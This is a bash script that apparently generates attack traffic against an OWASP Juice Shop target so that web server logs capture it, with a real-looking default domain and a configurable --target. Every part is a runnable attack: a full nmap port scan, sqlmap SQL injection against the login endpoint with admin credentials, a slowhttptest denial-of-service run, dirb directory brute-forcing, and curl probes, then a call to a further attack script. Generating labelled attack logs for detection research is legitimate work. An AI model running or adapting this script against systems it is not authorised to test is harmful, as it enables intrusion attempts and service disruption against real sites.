#!/bin/bash
set -e

# Parse command line arguments
TARGET="http://fancystore.com"  # Default target

while [ $# -gt 0 ]; do
  case $1 in
    --target)
      TARGET="$2"
      shift 2
      ;;
    *)
      echo "Unknown option $1"
      exit 1
      ;;
  esac
done

echo "[*] Attacking target: $TARGET"
echo "Setting up environment variables..."

# Extract hostname and port from target URL
TARGET_HOST=$(echo $TARGET | sed 's|http://||' | sed 's|https://||' | cut -d':' -f1)
TARGET_PORT=$(echo $TARGET | sed 's|http://||' | sed 's|https://||' | cut -d':' -f2)
if [ -z "$TARGET_PORT" ] || [ "$TARGET_PORT" = "$TARGET_HOST" ]; then
    TARGET_PORT="80"
fi

# Set environment variables for the attack script
export TARGET_HOST="$TARGET_HOST"
export TARGET_PORT="$TARGET_PORT"
export ATTACK_TYPE="sql_injection"
export ATTACK_PHASE="automated"
export VARIANT_ID="lowscan_moderate"

echo "Environment variables set:"
echo "  TARGET_HOST: $TARGET_HOST"
echo "  TARGET_PORT: $TARGET_PORT"
echo "  ATTACK_TYPE: $ATTACK_TYPE"
echo "  ATTACK_PHASE: $ATTACK_PHASE"
echo "  VARIANT_ID: $VARIANT_ID"

echo "Starting Day 2 Enhanced Attack Script..."
echo "Sleeping for 30 seconds before starting the attack..."
sleep 30

# ========================================
# DAY 2: REAL ATTACK SCRIPTS
# ========================================

echo "[*] ========================================"
echo "[*] DAY 2: REAL ATTACK SCRIPTS"
echo "[*] ========================================"

# 1. nmap Web 端口扫描
echo "[*] 1. Running nmap Web port scan..."
echo "[*] Command: nmap -sV -p- --script=http-title $TARGET"
nmap -sV -p- --script=http-title $TARGET > /tmp/nmap_scan.txt 2>&1
echo "[+] Nmap scan completed, results saved to /tmp/nmap_scan.txt"
cat /tmp/nmap_scan.txt

# 2. sqlmap注入测试（针对Juice Shop的REST API）
echo "[*] 2. Running sqlmap SQL injection test..."
echo "[*] Command: sqlmap -u \"$TARGET/rest/user/login\" --data='{\"email\":\"admin@juice-sh.op\",\"password\":\"123456\"}' --method=POST --batch --level=3 --risk=2 --threads=2 --random-agent --user-agent=\"attacker\""
sqlmap -u "$TARGET/rest/user/login" \
       --data='{"email":"admin@juice-sh.op","password":"123456"}' \
       --method=POST \
       --batch \
       --level=3 \
       --risk=2 \
       --threads=2 \
       --random-agent \
       --user-agent="attacker" \
       --output-dir=/tmp/sqlmap_results

# 3. Slow HTTP 攻击（slowhttptest）
echo "[*] 3. Running slowhttptest DoS attack..."
echo "[*] Command: slowhttptest -c 50 -H -i 10 -r 200 -t GET -u \"$TARGET\" -x 24 -p 3"
slowhttptest -c 50 -H -i 10 -r 200 -t GET -u "$TARGET" -x 24 -p 3 &
SLOWHTTP_PID=$!

# Wait for slowhttptest to run for 30 seconds
echo "[*] Slowhttptest running for 30 seconds..."
sleep 30

# Stop slowhttptest
echo "[*] Stopping slowhttptest..."
kill $SLOWHTTP_PID 2>/dev/null || true

# 4. Additional Web enumeration with dirb
echo "[*] 4. Running dirb directory enumeration..."
echo "[*] Command: dirb $TARGET /usr/share/dirb/wordlists/common.txt -S -r -w"
dirb $TARGET /usr/share/dirb/wordlists/common.txt -S -r -w > /tmp/dirb_results.txt 2>&1
echo "[+] Dirb scan completed, results saved to /tmp/dirb_results.txt"

# 5. Custom curl attacks with specific User-Agent
echo "[*] 5. Running custom curl attacks with attacker User-Agent..."
echo "[*] Testing various endpoints with attacker User-Agent"

# Test login endpoint with SQL injection
curl -s -o /dev/null -w "Login endpoint: %{http_code}\n" \
     -H "User-Agent: attacker" \
     -H "Content-Type: application/json" \
     -d '{"email":"admin@juice-sh.op","password":"123456"}' \
     "$TARGET/rest/user/login"

# Test search endpoint with SQL injection
curl -s -o /dev/null -w "Search endpoint: %{http_code}\n" \
     -H "User-Agent: attacker" \
     -H "Content-Type: application/json" \
     -d '{"q":"test"}' \
     "$TARGET/rest/products/search"

# Test admin endpoint
curl -s -o /dev/null -w "Admin endpoint: %{http_code}\n" \
     -H "User-Agent: attacker" \
     "$TARGET/#/administration"

# Test basket endpoint
curl -s -o /dev/null -w "Basket endpoint: %{http_code}\n" \
     -H "User-Agent: attacker" \
     "$TARGET/#/basket"

echo "[*] ========================================"
echo "[*] DAY 2 ATTACK COMPLETED"
echo "[*] ========================================"
echo "[*] Attack completed successfully!"
echo "[*] Check nginx logs for attack traffic recording"
echo "[*] Results saved to:"
echo "[*] - /tmp/nmap_scan.txt"
echo "[*] - /tmp/sqlmap_results/"
echo "[*] - /tmp/dirb_results.txt"
echo "[*] ========================================"

# Run the original SecurityLogs attack script as well
echo "[*] Running original SecurityLogs attack script..."
python3 /opt/scripts/container_attack.py --variant-id moderate


